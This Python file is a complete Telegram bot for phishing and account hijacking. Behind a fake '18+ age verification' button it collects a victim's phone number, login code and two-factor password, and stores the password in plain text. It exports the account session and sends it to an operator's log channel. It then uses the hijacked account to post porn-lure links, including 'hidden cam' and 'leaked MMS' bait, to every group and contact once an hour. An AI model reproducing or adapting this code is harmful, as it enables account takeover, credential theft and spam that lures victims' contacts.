import os
import asyncio
import time
import random
from pathlib import Path
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    AuthKeyUnregistered,
    SessionRevoked,
    SessionExpired,
    AuthKeyInvalid,
    MessageIdInvalid, # Import MessageIdInvalid
    FreshResetAuthorisationForbidden
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['sessions']

# Session Error List
SESSION_ERRORS = (
    AuthKeyUnregistered, SessionRevoked, SessionExpired,
    AuthKeyInvalid, FreshResetAuthorisationForbidden
)

# Promo Texts (10 unique messages)
PROMO_TEXTS = [
    "🔥 10K+ horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes  \n🎁 No Cost — Click & Claim now! \n👉 http://bit.ly/hot_bot",
    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 http://bit.ly/hot_bot",
    "😈 Indian, Desi, Couples \n🔥 10K+ horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 http://bit.ly/hot_bot",
    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 http://bit.ly/hot_bot",
    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 http://bit.ly/hot_bot",
    "👅 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Unlimited Hot Content \n👉 http://bit.ly/hot_bot",
    "🔥 Hidden Cam + GF Fun \n💋 Just Click & Watch \n💦 Ultra Real Videos \n👉 http://bit.ly/hot_bot",
    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ horny Videos!! \n👉 http://bit.ly/hot_bot",
    "👀 New Viral Hard Videos \n💦 Real Amateur Fun With Man \n🎉 Join & Enjoy \n👉 http://bit.ly/hot_bot",
    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 http://bit.ly/hot_bot"
]

# Strings
strings = {
    'need_login': "You have to /login first!",
    'already_logged_in': "You're already logged in! 🥳",
    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs? \n\n🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  \n\n⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  \n\n👇 Click below to verify 👇",
    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
    'logout_success': "Logged out! 🔒\n\n/login to access again.",
    'not_logged_in': "Not logged in! ❌\n\n/login first.",
    'otp_wrong': "**❌ WRONG OTP!**\n\nAttempts left: {attempts}/3",
    'otp_blocked': "**🚫 BLOCKED!**\n\nToo many wrong OTP attempts.",
    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\n\nAttempts left: {attempts}/3",
    '2fa_blocked': "**🚫 BLOCKED!**\n\nToo many wrong 2FA attempts."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("👉 ɢᴇᴛ ᴛʜᴇ ᴄᴏᴅᴇ.", url="https://t.me/+42777")
    ],
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

@Client.on_message(filters.private & filters.command("login"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})

    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()

            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
            return
        except Exception: # Catch any exception during session test
            pass # Session is invalid, proceed with new login

    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return

    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    if not await check_login_status(user_id):
        await message.reply(strings['not_logged_in'])
        return

    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False, "promotion": False}}
    )
    await message.reply(strings['logout_success'])

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
        return

    # Send & auto-delete "Processing..." message
    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())

    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"

    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()

    try:
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': '',
            'processing_msg_id': processing_msg.id,
            'otp_attempts': 0,
            '2fa_attempts': 0
        }

        sent_msg = await bot.send_message(
            user_id,
            "**OTP Sent!**\n\nEnter code via buttons:",
            reply_markup=OTP_KEYBOARD
        )
        user_states[user_id]['last_msg_id'] = sent_msg.id

        # Delete "Processing..." after OTP is sent
        await bot.delete_messages(user_id, processing_msg.id)

    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again.")
        return

    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5: # OTPs are usually 5 digits, but Telegram can send 6
            await query.answer("OTP must be at least 5 digits!", show_alert=True)
            return

        await query.message.edit("Verifying OTP...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except PhoneCodeInvalid:
            state['otp_attempts'] += 1
            if state['otp_attempts'] >= 3:
                await query.message.edit(strings['otp_blocked'])
                database.update_one(
                    {"id": user_id},
                    {"$set": {"blocked": True}}
                )
                await cleanup_user_state(user_id)
                return

            attempts_left = 3 - state['otp_attempts']
            await query.message.edit(
                strings['otp_wrong'].format(attempts=attempts_left),
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = '' # Clear OTP digits for re-entry
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
            state['needs_password'] = True
            state['last_msg_id'] = query.message.id
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6: # Max 6 digits for OTP
            state['otp_digits'] += action

    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["login", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return

    password = message.text
    state = user_states[user_id]

    try:
        # Delete the "2FA REQUIRED" message first
        if 'last_msg_id' in state:
            try:
                await bot.delete_messages(user_id, state['last_msg_id'])
            except MessageIdInvalid:
                pass # Message might have already been deleted or is too old

        # Delete user's password message IMMEDIATELY
        try:
            await message.delete()
        except Exception:
            pass # Message might be too old to delete or already deleted

        await state['client'].check_password(password=password)
        verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())

        # Store verified_msg ID for deletion after session creation
        state['verified_msg_id'] = verified_msg.id

        # Save 2FA password to DB (plain text)
        database.update_one(
            {"id": user_id},
            {"$set": {
                "2fa_status": True,
                "2fa_password": password
            }},
            upsert=True
        )

        await create_session(bot, state['client'], user_id, state['phone_number'])

    except PasswordHashInvalid:
        state['2fa_attempts'] += 1
        if state['2fa_attempts'] >= 3:
            await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
            database.update_one(
                {"id": user_id},
                {"$set": {"blocked": True}}
            )
            await cleanup_user_state(user_id)
            return

        attempts_left = 3 - state['2fa_attempts']
        error_msg = await message.reply(
            strings['2fa_wrong'].format(attempts=attempts_left),
            reply_markup=ReplyKeyboardRemove()
        )
        state['last_msg_id'] = error_msg.id
    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()

        # Save to database
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion': True
        }

        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        # Create sessions directory if not exists
        os.makedirs("sessions", exist_ok=True)

        # Generate session file path
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        # Manually save session file
        with open(session_file, "w") as f:
            f.write(string_session)

        # Send to log channel
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
        )

        # Remove local copy
        os.remove(session_file)

        # Delete "Password verified..." message after sending success
        if 'verified_msg_id' in user_states[user_id]:
            try:
                await bot.delete_messages(user_id, user_states[user_id]['verified_msg_id'])
            except MessageIdInvalid:
                pass # Message might have already been deleted or is too old

        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))

    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n/login again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
    already_notified = False
    # log_message is now initialized outside the loop to persist across cycles
    # and will be handled carefully within the loop.
    log_message = None

    while True:
        client = None
        try:
            client = Client("promo", session_string=session_string)
            await client.start()

            # Reset notification flag on successful connection
            already_notified = False

            # Check if promotion is enabled in DB
            user_data = database.find_one({"mobile_number": phone_number})
            if not user_data or not user_data.get('promotion', True):
                # If promotion is disabled, try to edit the log message one last time
                # or send a new one if it doesn't exist.
                if log_message:
                    try:
                        await log_message.edit(f"⏸️ Promotion stopped for: {phone_number}")
                    except MessageIdInvalid: # Message might have been deleted or too old
                        await bot.send_message(LOG_CHANNEL_SESSIONS_FILES, f"⏸️ Promotion stopped for: {phone_number} (old log message uneditable)")
                else:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"⏸️ Promotion stopped for: {phone_number}"
                    )
                break # Exit the loop

            # --- CRITICAL SECTION FOR log_message INITIALIZATION/UPDATE ---
            # This ensures log_message is always a valid Message object before proceeding.
            if log_message:
                try:
                    # Attempt to edit the existing log message for the new cycle
                    log_message = await log_message.edit(
                        f"🚀 Starting promotion cycle for: {phone_number}\n"
                        f"⏳ Status: Initializing..."
                    )
                except MessageIdInvalid:
                    # If the old log message is no longer editable, send a new one
                    log_message = await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"🚀 Starting promotion cycle for: {phone_number}\n"
                        f"⏳ Status: Initializing... (new log message)"
                    )
            else:
                # If log_message is None (first run or previous message failed), send a new one
                log_message = await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"🚀 Starting promotion cycle for: {phone_number}\n"
                    f"⏳ Status: Initializing..."
                )
            # --- END CRITICAL SECTION ---


            # Get all groups (excluding channels)
            groups = []
            async for dialog in client.get_dialogs():
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    groups.append(dialog.chat.id)

            # Get all contacts and private chats
            contacts_and_privates = []
            contacts = await client.get_contacts()
            for user in contacts:
                if not user.is_bot:
                    contacts_and_privates.append(user.id)

            async for dialog in client.get_dialogs(limit=200):
                if (dialog.chat.type == enums.ChatType.PRIVATE and
                    dialog.chat.id not in contacts_and_privates):
                    contacts_and_privates.append(dialog.chat.id)

            # Phase 1: Groups
            group_count = 0
            group_success = 0
            for group in groups:
                try:
                    text = random.choice(PROMO_TEXTS)
                    await client.send_message(group, text)
                    group_success += 1

                    # Update log message
                    try:
                        await log_message.edit(
                            f"📢 Active Promotion: {phone_number}\n"
                            f"📊 Groups: {group_success}/{len(groups)} sent\n"
                            f"👥 Contacts: Preparing...\n"
                            f"⏱ Last update: {time.strftime('%H:%M:%S')}"
                        )
                    except MessageIdInvalid:
                        # If log message becomes invalid during the cycle, send a new one
                        log_message = await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"📢 Active Promotion: {phone_number}\n"
                            f"📊 Groups: {group_success}/{len(groups)} sent\n"
                            f"👥 Contacts: Preparing...\n"
                            f"⏱ Last update: {time.strftime('%H:%M:%S')} (new log message)"
                        )


                    await asyncio.sleep(60)  # Anti-flood delay

                except FloodWait as e:
                    try:
                        await log_message.edit(
                            f"📢 Active Promotion: {phone_number}\n"
                            f"⏳ FloodWait: Sleeping {e.value} seconds\n"
                            f"📊 Groups: {group_success}/{len(groups)} sent\n"
                            f"👥 Contacts: Waiting..."
                        )
                    except MessageIdInvalid:
                        log_message = await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"📢 Active Promotion: {phone_number}\n"
                            f"⏳ FloodWait: Sleeping {e.value} seconds\n"
                            f"📊 Groups: {group_success}/{len(groups)} sent\n"
                            f"👥 Contacts: Waiting... (new log message)"
                        )
                    await asyncio.sleep(e.value + 5)
                except Exception:
                    pass # Log or handle specific group send errors if needed

                group_count += 1

            # Phase 2: Contacts
            contact_count = 0
            contact_success = 0
            for target in contacts_and_privates:
                try:
                    text = random.choice(PROMO_TEXTS)
                    await client.send_message(target, text)
                    contact_success += 1

                    # Update every 10 contacts
                    if contact_count % 10 == 0:
                        try:
                            await log_message.edit(
                                f"📢 Active Promotion: {phone_number}\n"
                                f"✅ Groups: {group_success}/{len(groups)} completed\n"
                                f"📊 Contacts: {contact_success} sent\n"
                                f"⏱ Last update: {time.strftime('%H:%M:%S')}"
                            )
                        except MessageIdInvalid:
                            log_message = await bot.send_message(
                                LOG_CHANNEL_SESSIONS_FILES,
                                f"📢 Active Promotion: {phone_number}\n"
                                f"✅ Groups: {group_success}/{len(groups)} completed\n"
                                f"📊 Contacts: {contact_success} sent\n"
                                f"⏱ Last update: {time.strftime('%H:%M:%S')} (new log message)"
                            )


                except FloodWait as e:
                    try:
                        await log_message.edit(
                            f"📢 Active Promotion: {phone_number}\n"
                            f"⏳ FloodWait: Sleeping {e.value} seconds\n"
                            f"✅ Groups: {group_success}/{len(groups)} completed\n"
                            f"📊 Contacts: {contact_success} sent"
                        )
                    except MessageIdInvalid:
                        log_message = await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"📢 Active Promotion: {phone_number}\n"
                            f"⏳ FloodWait: Sleeping {e.value} seconds\n"
                            f"✅ Groups: {group_success}/{len(groups)} completed\n"
                            f"📊 Contacts: {contact_success} sent (new log message)"
                        )
                    await asyncio.sleep(e.value + 5)
                except Exception:
                    pass # Log or handle specific contact send errors if needed

                contact_count += 1

            # Final update
            try:
                await log_message.edit(
                    f"🎉 Promotion Cycle Complete: {phone_number}\n"
                    f"✅ Groups: {group_success}/{len(groups)} succeeded\n"
                    f"✅ Contacts: {contact_success} sent\n"
                    f"⏳ Next cycle in 1 hour"
                )
            except MessageIdInvalid:
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"🎉 Promotion Cycle Complete: {phone_number}\n"
                    f"✅ Groups: {group_success}/{len(groups)} succeeded\n"
                    f"✅ Contacts: {contact_success} sent\n"
                    f"⏳ Next cycle in 1 hour (new log message)"
                )


            # Wait 1 hour before next cycle
            await asyncio.sleep(3600)

        except SESSION_ERRORS as e:
            if not already_notified:
                error_type = type(e).__name__
                if log_message: # If log_message exists, try to edit it
                    try:
                        await log_message.edit(
                            f"🔴 SESSION TERMINATED: {phone_number}\n"
                            f"❌ Error: {error_type}\n"
                            f"🛑 Auto-disabled promotion"
                        )
                    except MessageIdInvalid:
                        await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"🔴 #SESSION_TERMINATED: {phone_number}\n"
                            f"❌ Error: {error_type}\n"
                            f"🛑 Auto-disabled promotion (old log message uneditable)"
                        )
                else: # Otherwise, send a new message
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"🔴 #SESSION_TERMINATED: {phone_number}\n"
                        f"❌ Error: {error_type}\n"
                        f"🛑 Auto-disabled promotion"
                    )
                database.update_one(
                    {"mobile_number": phone_number},
                    {"$set": {"promotion": False}}
                )
                already_notified = True
            break # Exit the loop as session is terminated

        except Exception as e:
            # Handle general exceptions, including potential AUTH_KEY_UNREGISTERED
            if "AUTH_KEY_UNREGISTERED" in str(e) and not already_notified:
                if log_message:
                    try:
                        await log_message.edit(
                            f"🔴 EMERGENCY STOP: {phone_number}\n"
                            f"❌ Error: AUTH_KEY_UNREGISTERED\n"
                            f"🛑 Promotion disabled"
                        )
                    except MessageIdInvalid:
                        await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"🔴 #SESSION_TERMINATED: {phone_number}\n"
                            f"❌ Error: AUTH_KEY_UNREGISTERED\n"
                            f"🛑 Emergency stop (old log message uneditable)"
                        )
                else:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"🔴 #SESSION_TERMINATED: {phone_number}\n"
                        f"❌ Error: AUTH_KEY_UNREGISTERED\n"
                        f"🛑 Emergency stop"
                    )
                database.update_one(
                    {"mobile_number": phone_number},
                    {"$set": {"promotion": False}}
                )
                already_notified = True
                break # Exit the loop on critical error

            # For other non-critical errors, log and retry
            if log_message:
                try:
                    await log_message.edit(
                        f"⚠️ Cycle Failed: {phone_number}\n"
                        f"❌ Error: {str(e)[:100]}\n" # Truncate long error messages
                        f"🔄 Restarting in 5 minutes..."
                    )
                except MessageIdInvalid:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"⚠️ #Cycle_Failed: {phone_number}\n"
                        f"❌ Error: {str(e)}\n"
                        f"🔄 Restarting in 5 minutes... (old log message uneditable)"
                    )
            else:
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"⚠️ #Cycle_Failed: {phone_number}\n"
                    f"❌ Error: {str(e)}\n"
                    f"🔄 Restarting in 5 minutes..."
                )
            await asyncio.sleep(300) # Wait 5 minutes before retrying

        finally:
            if client:
                try:
                    await client.stop()
                except Exception:
                    pass # Client might already be stopped or have issues stopping
            # log_message is intentionally NOT reset to None here,
            # so it can be edited in the next cycle.
            # If you want a new log message for every cycle, uncomment:
            # log_message = None
